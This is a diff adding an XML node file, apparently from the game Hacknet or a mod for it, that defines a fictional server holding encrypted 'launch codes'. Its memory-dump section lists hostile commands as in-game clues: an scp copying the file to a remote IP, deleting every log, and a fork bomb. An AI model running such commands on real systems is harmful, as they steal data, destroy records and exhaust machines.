@@ -1,0 +1,31 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Computer id="E4N3" ip="6.0.0.49" name="Nuclear launch codes here" type="4">
+
+    <proxy time="1"/>
+    <firewall level="7" solution="PjfUY1L" additionalTime="0.0"/>
+    <portsForCrack val="7"/>
+    <ports>21,22,80,443,1433,192,104</ports>
+    
+    <file path="encrypted" name="launch_codes.enc">#BINARY#</file>
+    
+    <!--hopefully this can be downloaded as the memory dump file-->
+    
+    <Memory>
+        <Commands>
+            <Command>scp launch_codes.enc admin@246.104.77.154:/home/.</Command>
+            <Command>cd logs</Command>
+            <Command>rm *</Command>
+            <Command>forkbomb</Command>
+        </Commands>
+        <Data>
+            <Block>EMPTY</Block>
+        </Data>
+        <Images>
+            <Image>EMPTY</Image>
+        </Images>
+    </Memory>
+    
+
+    <WhitelistAuthenticatorDaemon Remote="E4N2"/>
+
+</Computer>
